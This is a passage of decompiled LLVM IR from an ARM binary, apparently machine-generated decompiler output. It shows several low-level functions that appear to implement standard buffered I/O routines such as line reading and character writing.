dec_label_pc_f0d0:                                ; preds = %dec_label_pc_efac, %dec_label_pc_f010, %dec_label_pc_f0ac
  %v0_f0d4 = phi i32 [ %v0_f000, %dec_label_pc_efac ], [ %v0_f000, %dec_label_pc_f010 ], [ %v0_f0d4.pre, %dec_label_pc_f0ac ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_f0d4 = add i32 %v0_f0d4, 12
  %v3_f0d4 = inttoptr i32 %v2_f0d4 to i32*
  %v4_f0d4 = load i32, i32* %v3_f0d4, align 4
  %v1_f0d8 = inttoptr i32 %v4_f0d4 to i32*
  %v2_f0d8 = load i32, i32* %v1_f0d8, align 4
  %v1_f0dc = add i32 %v2_f0d8, -1
  store i32 %v1_f0dc, i32* %v1_f0d8, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_f0f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f0f0 = add i32 %v0_f0f0, 24
  %v3_f0f0 = inttoptr i32 %v2_f0f0 to i32*
  %v4_f0f0 = load i32, i32* %v3_f0f0, align 4
  store i32 %v4_f0f0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_f0f0)
  %v2_f100 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f100, i32* %r4.global-to-local, align 4
  ret i32 %v2_efdc

; uselistorder directives
  uselistorder i32 %v0_f09c, { 2, 1, 0 }
  uselistorder i32 %v4_efd0, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder label %dec_label_pc_f0d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f09c, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_f064, { 1, 0 }
}

define i32 @function_f10c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f10c:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_f10c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f10c, label %bb, label %dec_label_pc_f10c..thread8_crit_edge

dec_label_pc_f10c..thread8_crit_edge:             ; preds = %dec_label_pc_f10c
  %v0_f148.pre = load i32, i32* @r0, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_f10c
  store i32 0, i32* @r0, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_f10c..thread8_crit_edge, %bb
  %v0_f164.pr = phi i32 [ %v0_f148.pre, %dec_label_pc_f10c..thread8_crit_edge ], [ 0, %bb ]
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %sb.global-to-local, align 4
  %v4_f144 = load i32, i32* inttoptr (i32 143012 to i32*), align 4
  store i32 %v4_f144, i32* %r3.global-to-local, align 4
  %v9_f148 = icmp eq i32 %v0_f164.pr, %v4_f144
  store i32 %v0_f164.pr, i32* %fp.global-to-local, align 4
  br i1 %v9_f148, label %bb49, label %dec_label_pc_f160

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_f170

dec_label_pc_f160:                                ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_f164 = icmp eq i32 %v0_f164.pr, 0
  br i1 %v2_f164, label %dec_label_pc_f170, label %dec_label_pc_f2d8

dec_label_pc_f170:                                ; preds = %bb49, %dec_label_pc_f160
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_f160 ]
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_f184 = load i32, i32* inttoptr (i32 143076 to i32*), align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_f190 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v4_f184, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f190)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_f1b4 = load i32, i32* %sb.global-to-local, align 4
  %v2_f1b4 = add i32 %v0_f1b4, 16
  %v3_f1b4 = inttoptr i32 %v2_f1b4 to i32*
  %v4_f1b4 = load i32, i32* %v3_f1b4, align 4
  call void @__pseudo_branch(i32 %v4_f1b4)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_f1c4 = add i32 %v0_f1b4, 12
  %v3_f1c4 = inttoptr i32 %v2_f1c4 to i32*
  %v4_f1c4 = load i32, i32* %v3_f1c4, align 4
  store i32 %v4_f1c4, i32* %r2.global-to-local, align 4
  %v1_f1c8 = inttoptr i32 %v4_f1c4 to i32*
  %v2_f1c8 = load i32, i32* %v1_f1c8, align 4
  %v1_f1d0 = add i32 %v2_f1c8, 1
  store i32 %v1_f1d0, i32* %r3.global-to-local, align 4
  %v2_f1d4 = add i32 %v0_f1b4, 24
  %v3_f1d4 = inttoptr i32 %v2_f1d4 to i32*
  %v4_f1d4 = load i32, i32* %v3_f1d4, align 4
  store i32 %v1_f1d0, i32* %v1_f1c8, align 4
  call void @__pseudo_branch(i32 %v4_f1d4)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_f1f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_f1f0 = add i32 %v0_f1f0, 100
  %v3_f1f0 = inttoptr i32 %v2_f1f0 to i32*
  %v4_f1f0 = load i32, i32* %v3_f1f0, align 4
  store i32 %v4_f1f0, i32* @r4, align 4
  store i32 %v4_f1f0, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f190)
  call void @__pseudo_branch(i32 %v4_f1b4)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_f218 = load i32, i32* %sb.global-to-local, align 4
  %v2_f218 = add i32 %v0_f218, 48
  %v3_f218 = inttoptr i32 %v2_f218 to i32*
  %v4_f218 = load i32, i32* %v3_f218, align 4
  store i32 %v4_f218, i32* %r3.global-to-local, align 4
  %v1_f224 = inttoptr i32 %v4_f218 to i32*
  %v2_f224 = load i32, i32* %v1_f224, align 4
  store i32 %v2_f224, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_f1d4)
  %v0_f230 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_f230, i32* @r6, align 4
  %v2_f234 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_f234, i32* @r8, align 4
  store i32 76, i32* %fp.global-to-local, align 4
  %v0_f2c8.pr = load i32, i32* @r7, align 4
  %v2_f2c828 = icmp eq i32 %v0_f2c8.pr, 0
  br i1 %v2_f2c828, label %dec_label_pc_f2d0, label %dec_label_pc_f23c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f170, %dec_label_pc_f2c4
  %v0_f248 = phi i32 [ %v3_f2c4, %dec_label_pc_f2c4 ], [ %v0_f2c8.pr, %dec_label_pc_f170 ]
  %v1_f23c = inttoptr i32 %v0_f248 to i16*
  %v2_f23c = load i16, i16* %v1_f23c, align 2
  %v3_f23c = zext i16 %v2_f23c to i32
  store i32 %v3_f23c, i32* %r3.global-to-local, align 4
  %v1_f240 = and i32 %v3_f23c, 64
  %v2_f240 = icmp eq i32 %v1_f240, 0
  br i1 %v2_f240, label %dec_label_pc_f2c4, label %dec_label_pc_f248

dec_label_pc_f248:                                ; preds = %dec_label_pc_f23c
  %v1_f248 = add i32 %v0_f248, 56
  store i32 %v1_f248, i32* @r4, align 4
  store i32 %v1_f248, i32* %r2.global-to-local, align 4
  %v1_f260 = call i32 @unknown_0()
  %v1_f270 = call i32 @unknown_0()
  %v0_f274 = load i32, i32* @r7, align 4
  %v1_f274 = inttoptr i32 %v0_f274 to i16*
  %v2_f274 = load i16, i16* %v1_f274, align 2
  %v3_f274 = zext i16 %v2_f274 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_f27c = or i32 %v3_f274, %stack_var_-60.1.in
  %v1_f280 = xor i32 %v2_f27c, 320
  store i32 %v1_f280, i32* %r3.global-to-local, align 4
  %v1_f284 = and i32 %v1_f280, 832
  %v2_f284 = icmp eq i32 %v1_f284, 0
  br i1 %v2_f284, label %dec_label_pc_f28c, label %bb50

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f248
  store i32 %v0_f274, i32* @r0, align 4
  %v0_f290 = call i32 @function_dc5c()
  %v2_f294 = icmp eq i32 %v0_f290, 0
  br i1 %v2_f294, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_f28c
  %v1_f298 = load i32, i32* @r7, align 4
  %v2_f298 = inttoptr i32 %v1_f298 to i16*
  %v3_f298 = load i16, i16* %v2_f298, align 2
  %v4_f298 = zext i16 %v3_f298 to i32
  store i32 %v4_f298, i32* %r3.global-to-local, align 4
  %v2_f29c = add i32 %v1_f298, 8
  %v3_f29c = inttoptr i32 %v2_f29c to i32*
  %v4_f29c = load i32, i32* %v3_f29c, align 4
  store i32 %v4_f29c, i32* %r2.global-to-local, align 4
  %v2_f2a0 = and i32 %v4_f298, 65471
  store i32 %v2_f2a0, i32* %r3.global-to-local, align 4
  %v3_f2a4 = add i32 %v1_f298, 28
  %v4_f2a4 = inttoptr i32 %v3_f2a4 to i32*
  store i32 %v4_f29c, i32* %v4_f2a4, align 4
  %v1_f2a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_f2a8 = trunc i32 %v1_f2a8 to i16
  %v3_f2a8 = load i32, i32* @r7, align 4
  %v4_f2a8 = inttoptr i32 %v3_f2a8 to i16*
  store i16 %v2_f2a8, i16* %v4_f2a8, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_f28c
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_f248, %.thread17
  %v1_f2c0 = call i32 @unknown_0()
  %v0_f2c4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f2c4

dec_label_pc_f2c4:                                ; preds = %dec_label_pc_f23c, %bb50
  %v0_f2c4 = phi i32 [ %v0_f248, %dec_label_pc_f23c ], [ %v0_f2c4.pre, %bb50 ]
  %v1_f2c4 = add i32 %v0_f2c4, 32
  %v2_f2c4 = inttoptr i32 %v1_f2c4 to i32*
  %v3_f2c4 = load i32, i32* %v2_f2c4, align 4
  store i32 %v3_f2c4, i32* @r7, align 4
  %v2_f2c8 = icmp eq i32 %v3_f2c4, 0
  br i1 %v2_f2c8, label %dec_label_pc_f2d0, label %dec_label_pc_f23c

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2c4, %dec_label_pc_f170
  %v0_f2d0 = call i32 @function_efac()
  %v0_f30c.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_f2d8:                                ; preds = %dec_label_pc_f160
  %v1_f2d8 = inttoptr i32 %v0_f164.pr to i16*
  %v2_f2d8 = load i16, i16* %v1_f2d8, align 2
  %v3_f2d8 = zext i16 %v2_f2d8 to i32
  %v1_f2dc = and i32 %v3_f2d8, 64
  store i32 %v1_f2dc, i32* %r3.global-to-local, align 4
  %v2_f2dc = icmp eq i32 %v1_f2dc, 0
  br i1 %v2_f2dc, label %bb51, label %dec_label_pc_f2e8

bb51:                                             ; preds = %dec_label_pc_f2d8
  br label %bb52

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2d8
  %v0_f2e8 = call i32 @function_dc5c()
  %v2_f2ec = icmp eq i32 %v0_f2e8, 0
  br i1 %v2_f2ec, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_f2e8
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_f2e8
  %v1_f2f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_f2f0 = inttoptr i32 %v1_f2f0 to i16*
  %v3_f2f0 = load i16, i16* %v2_f2f0, align 2
  %v4_f2f0 = zext i16 %v3_f2f0 to i32
  store i32 %v4_f2f0, i32* %r3.global-to-local, align 4
  %v2_f2f4 = add i32 %v1_f2f0, 8
  %v3_f2f4 = inttoptr i32 %v2_f2f4 to i32*
  %v4_f2f4 = load i32, i32* %v3_f2f4, align 4
  store i32 %v4_f2f4, i32* %r2.global-to-local, align 4
  %v2_f2f8 = and i32 %v4_f2f0, 65471
  store i32 %v2_f2f8, i32* %r3.global-to-local, align 4
  %v2_f2fc = trunc i32 %v2_f2f8 to i16
  store i16 %v2_f2fc, i16* %v2_f2f0, align 2
  %v1_f300 = load i32, i32* %r2.global-to-local, align 4
  %v2_f300 = load i32, i32* %fp.global-to-local, align 4
  %v3_f300 = add i32 %v2_f300, 28
  %v4_f300 = inttoptr i32 %v3_f300 to i32*
  store i32 %v1_f300, i32* %v4_f300, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_f2d0, %.thread24
  %v0_f30c = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_f30c.pre, %dec_label_pc_f2d0 ], [ 0, %.thread24 ]
  ret i32 %v0_f30c

; uselistorder directives
  uselistorder i32 %v3_f2c4, { 1, 2, 0 }
  uselistorder i32 %v0_f1b4, { 1, 0, 2 }
  uselistorder i32 %v0_f164.pr, { 1, 0, 2, 3 }
  uselistorder i32* %fp.global-to-local, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 ()* @function_efac, { 1, 0 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_f2c4, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f23c, { 1, 0 }
  uselistorder label %dec_label_pc_f170, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_f320(i32 %arg1) local_unnamed_addr {
dec_label_pc_f320:
  %v0_f320 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f320, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_f320
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_f320, %bb
  %v5_f33c = phi i32 [ %arg1, %dec_label_pc_f320 ], [ 0, %bb ]
  ret i32 %v5_f33c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_f340(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f340:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_f340 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f344 = icmp eq i32 %arg2, 0
  store i1 %v2_f344, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_f3cc, label %dec_label_pc_f3b4.preheader

dec_label_pc_f3b4.preheader:                      ; preds = %dec_label_pc_f340
  store i32 %tmp, i32* @r5, align 4
  %v1_f3b42 = add i32 %arg2, -1
  store i32 %v1_f3b42, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b48 = icmp eq i32 %arg2, 1
  store i1 %v7_f3b48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b48, label %dec_label_pc_f3bc, label %dec_label_pc_f360

dec_label_pc_f360:                                ; preds = %dec_label_pc_f3b4.preheader, %dec_label_pc_f3b4.backedge.dec_label_pc_f360_crit_edge
  %v0_f384 = phi i32 [ %v0_f360.pre, %dec_label_pc_f3b4.backedge.dec_label_pc_f360_crit_edge ], [ %arg3, %dec_label_pc_f3b4.preheader ]
  %v1_f360 = add i32 %v0_f384, 16
  %v2_f360 = inttoptr i32 %v1_f360 to i32*
  %v3_f360 = load i32, i32* %v2_f360, align 4
  store i32 %v3_f360, i32* %r2.global-to-local, align 4
  %v1_f364 = add i32 %v0_f384, 24
  %v2_f364 = inttoptr i32 %v1_f364 to i32*
  %v3_f364 = load i32, i32* %v2_f364, align 4
  store i32 %v3_f364, i32* %r3.global-to-local, align 4
  %v3_f368 = icmp uge i32 %v3_f360, %v3_f364
  store i1 %v3_f368, i1* %cpsr_c.global-to-local, align 1
  %v9_f368 = icmp eq i32 %v3_f360, %v3_f364
  store i1 %v9_f368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f368, label %dec_label_pc_f384, label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %dec_label_pc_f360
  %v1_f370 = inttoptr i32 %v3_f360 to i8*
  %v2_f370 = load i8, i8* %v1_f370, align 1
  %v3_f370 = zext i8 %v2_f370 to i32
  store i32 %v3_f370, i32* %r3.global-to-local, align 4
  %v5_f370 = add i32 %v3_f360, 1
  store i32 %v5_f370, i32* %r2.global-to-local, align 4
  %v2_f374 = load i32, i32* @r5, align 4
  %v3_f374 = inttoptr i32 %v2_f374 to i8*
  store i8 %v2_f370, i8* %v3_f374, align 1
  %v4_f374 = load i32, i32* @r5, align 4
  %v5_f374 = add i32 %v4_f374, 1
  store i32 %v5_f374, i32* @r5, align 4
  %v0_f378 = load i32, i32* %r3.global-to-local, align 4
  %v2_f378 = icmp ugt i32 %v0_f378, 9
  store i1 %v2_f378, i1* %cpsr_c.global-to-local, align 1
  %v7_f378 = icmp eq i32 %v0_f378, 10
  store i1 %v7_f378, i1* %cpsr_z.global-to-local, align 1
  %v0_f37c = load i32, i32* %r2.global-to-local, align 4
  %v1_f37c = load i32, i32* @r4, align 4
  %v2_f37c = add i32 %v1_f37c, 16
  %v3_f37c = inttoptr i32 %v2_f37c to i32*
  store i32 %v0_f37c, i32* %v3_f37c, align 4
  br i1 %v7_f378, label %dec_label_pc_f3bc, label %dec_label_pc_f3b4.backedge

dec_label_pc_f384:                                ; preds = %dec_label_pc_f360
  %v1_f384 = inttoptr i32 %v0_f384 to i16*
  %v3_f388 = call i32 @function_145cc(i16* %v1_f384)
  %v3_f38c = icmp eq i32 %v3_f388, -1
  store i1 %v3_f38c, i1* %cpsr_c.global-to-local, align 1
  %v8_f38c = icmp eq i32 %v3_f388, -1
  store i1 %v8_f38c, i1* %cpsr_z.global-to-local, align 1
  %v1_f390 = urem i32 %v3_f388, 256
  store i32 %v1_f390, i32* %r3.global-to-local, align 4
  br i1 %v3_f38c, label %dec_label_pc_f398, label %dec_label_pc_f3b0

dec_label_pc_f398:                                ; preds = %dec_label_pc_f384
  %v0_f398 = load i32, i32* @r4, align 4
  %v1_f398 = inttoptr i32 %v0_f398 to i16*
  %v2_f398 = load i16, i16* %v1_f398, align 2
  %v3_f398 = zext i16 %v2_f398 to i32
  store i32 %v3_f398, i32* %r3.global-to-local, align 4
  %v1_f39c = and i32 %v3_f398, 8
  %v2_f39c = icmp eq i32 %v1_f39c, 0
  store i1 %v2_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f39c, label %dec_label_pc_f3bc, label %dec_label_pc_f3cc

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f384
  %v1_f3a8 = trunc i32 %v3_f388 to i8
  %v2_f3a8 = load i32, i32* @r5, align 4
  %v3_f3a8 = inttoptr i32 %v2_f3a8 to i8*
  store i8 %v1_f3a8, i8* %v3_f3a8, align 1
  %v4_f3a8 = load i32, i32* @r5, align 4
  %v5_f3a8 = add i32 %v4_f3a8, 1
  store i32 %v5_f3a8, i32* @r5, align 4
  %v0_f3ac = load i32, i32* %r3.global-to-local, align 4
  %v2_f3ac = icmp ugt i32 %v0_f3ac, 9
  store i1 %v2_f3ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f3ac = icmp eq i32 %v0_f3ac, 10
  store i1 %v7_f3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3ac, label %dec_label_pc_f3bc, label %dec_label_pc_f3b4.backedge

dec_label_pc_f3b4.backedge:                       ; preds = %dec_label_pc_f3b0, %dec_label_pc_f370
  %v0_f3b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_f3b4 = add i32 %v0_f3b4, -1
  store i32 %v1_f3b4, i32* %r6.global-to-local, align 4
  %v2_f3b4 = icmp ne i32 %v0_f3b4, 0
  store i1 %v2_f3b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b4 = icmp eq i32 %v0_f3b4, 1
  store i1 %v7_f3b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b4, label %dec_label_pc_f3bc, label %dec_label_pc_f3b4.backedge.dec_label_pc_f360_crit_edge

dec_label_pc_f3b4.backedge.dec_label_pc_f360_crit_edge: ; preds = %dec_label_pc_f3b4.backedge
  %v0_f360.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f360

dec_label_pc_f3bc:                                ; preds = %dec_label_pc_f3b0, %dec_label_pc_f3b4.backedge, %dec_label_pc_f370, %dec_label_pc_f3b4.preheader, %dec_label_pc_f398
  %v0_f3bc = load i32, i32* @r5, align 4
  %v1_f3bc = load i32, i32* @r7, align 4
  %v3_f3bc = icmp uge i32 %v0_f3bc, %v1_f3bc
  store i1 %v3_f3bc, i1* %cpsr_c.global-to-local, align 1
  %v9_f3bc = icmp eq i32 %v0_f3bc, %v1_f3bc
  store i1 %v9_f3bc, i1* %cpsr_z.global-to-local, align 1
  %v2_f3c0 = xor i1 %v9_f3bc, true
  %v3_f3c0 = and i1 %v3_f3bc, %v2_f3c0
  br i1 %v3_f3c0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_f3bc
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_f3c4 = inttoptr i32 %v0_f3bc to i8*
  store i8 0, i8* %v7_f3c4, align 1
  %v0_f3c8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f3c8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_f3bc, %bb
  %v1_f3c8 = phi i1 [ %v1_f3c8.pre, %bb ], [ %v9_f3bc, %dec_label_pc_f3bc ]
  %v0_f3c8 = phi i1 [ %v0_f3c8.pre, %bb ], [ %v3_f3bc, %dec_label_pc_f3bc ]
  %v2_f3c8 = xor i1 %v1_f3c8, true
  %v3_f3c8 = and i1 %v0_f3c8, %v2_f3c8
  br i1 %v3_f3c8, label %.dec_label_pc_f3d0_crit_edge, label %dec_label_pc_f3cc

.dec_label_pc_f3d0_crit_edge:                     ; preds = %.thread14
  %v0_f3d0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f3d0

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f340, %dec_label_pc_f398, %.thread14
  br label %dec_label_pc_f3d0

dec_label_pc_f3d0:                                ; preds = %.dec_label_pc_f3d0_crit_edge, %dec_label_pc_f3cc
  %v0_f3d0 = phi i32 [ %v0_f3d0.pre, %.dec_label_pc_f3d0_crit_edge ], [ 0, %dec_label_pc_f3cc ]
  store i32 %v6_f340, i32* @r5, align 4
  ret i32 %v0_f3d0

; uselistorder directives
  uselistorder i1 %v9_f3bc, { 1, 0, 2 }
  uselistorder i32 %v1_f3bc, { 1, 0 }
  uselistorder i32 %v0_f3bc, { 0, 2, 1 }
  uselistorder i32 %v0_f3b4, { 2, 0, 1 }
  uselistorder i32 %v0_f3ac, { 1, 0 }
  uselistorder i32 %v3_f388, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f378, { 1, 0 }
  uselistorder i32 %v3_f360, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f384, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_f3d0, { 1, 0 }
  uselistorder label %dec_label_pc_f3cc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_f3bc, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_f360, { 1, 0 }
}

define i32 @function_f3e0(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f3e0:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_f3e0 = load i32, i32* @r4, align 4
  store i32 %v3_f3e0, i32* %stack_var_-12, align 4
  %v6_f3e0 = load i32, i32* @r5, align 4
  %v2_f3e4 = add i32 %arg2, 16
  %v3_f3e4 = inttoptr i32 %v2_f3e4 to i32*
  %v4_f3e4 = load i32, i32* %v3_f3e4, align 4
  store i32 %v4_f3e4, i32* %r2.global-to-local, align 4
  %v2_f3e8 = add i32 %arg2, 28
  %v3_f3e8 = inttoptr i32 %v2_f3e8 to i32*
  %v4_f3e8 = load i32, i32* %v3_f3e8, align 4
  store i32 %v4_f3e8, i32* %r3.global-to-local, align 4
  %v3_f3ec = icmp uge i32 %v4_f3e4, %v4_f3e8
  store i1 %v3_f3ec, i1* %cpsr_c.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_f3f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f3f8, i32* @r5, align 4
  br i1 %v3_f3ec, label %dec_label_pc_f410, label %.thread

.thread:                                          ; preds = %dec_label_pc_f3e0
  %v2_f3fc = urem i32 %v0_f3f8, 256
  store i32 %v2_f3fc, i32* %r3.global-to-local, align 4
  %v2_f400 = trunc i32 %v0_f3f8 to i8
  %v4_f400 = inttoptr i32 %v4_f3e4 to i8*
  store i8 %v2_f400, i8* %v4_f400, align 1
  %v5_f400 = load i32, i32* %r2.global-to-local, align 4
  %v6_f400 = add i32 %v5_f400, 1
  store i32 %v6_f400, i32* %r2.global-to-local, align 4
  %v0_f404.pr.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f404.pr.pr, label %dec_label_pc_f410, label %.thread2

.thread2:                                         ; preds = %.thread
  %v1_f404 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_f404, i32* %r0.global-to-local, align 4
  store i32 %v6_f400, i32* %v3_f3e4, align 4
  br label %dec_label_pc_f4dc

dec_label_pc_f410:                                ; preds = %dec_label_pc_f3e0, %.thread
  %v3_f410 = load i16, i16* %tmp, align 2
  %v4_f410 = zext i16 %v3_f410 to i32
  %v1_f414 = and i32 %v4_f410, 192
  store i32 %v1_f414, i32* %r3.global-to-local, align 4
  %v2_f418 = icmp eq i32 %v1_f414, 192
  store i1 %v2_f418, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_f418, label %dec_label_pc_f434, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f410
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  %v4_f428 = call i32 @function_13a34(i16* nonnull %tmp, i32 128)
  store i32 %v4_f428, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f42c = icmp eq i32 %v4_f428, 0
  br i1 %v2_f42c, label %dec_label_pc_f434, label %dec_label_pc_f4d8

dec_label_pc_f434:                                ; preds = %dec_label_pc_f420, %dec_label_pc_f410
  %v0_f434 = load i32, i32* @r4, align 4
  %v1_f434 = add i32 %v0_f434, 4
  %v2_f434 = inttoptr i32 %v1_f434 to i32*
  %v3_f434 = load i32, i32* %v2_f434, align 4
  store i32 %v3_f434, i32* %r3.global-to-local, align 4
  %v2_f438 = icmp ugt i32 %v3_f434, -3
  store i1 %v2_f438, i1* %cpsr_c.global-to-local, align 1
  %v7_f438 = icmp eq i32 %v3_f434, -2
  br i1 %v7_f438, label %dec_label_pc_f4d0, label %dec_label_pc_f440

dec_label_pc_f440:                                ; preds = %dec_label_pc_f434
  %v1_f440 = add i32 %v0_f434, 12
  %v2_f440 = inttoptr i32 %v1_f440 to i32*
  %v3_f440 = load i32, i32* %v2_f440, align 4
  store i32 %v3_f440, i32* %r2.global-to-local, align 4
  %v1_f444 = add i32 %v0_f434, 8
  %v2_f444 = inttoptr i32 %v1_f444 to i32*
  %v3_f444 = load i32, i32* %v2_f444, align 4
  store i32 %v3_f444, i32* %r3.global-to-local, align 4
  %v3_f448 = icmp uge i32 %v3_f440, %v3_f444
  store i1 %v3_f448, i1* %cpsr_c.global-to-local, align 1
  %v9_f448 = icmp eq i32 %v3_f440, %v3_f444
  br i1 %v9_f448, label %dec_label_pc_f4b4, label %dec_label_pc_f450

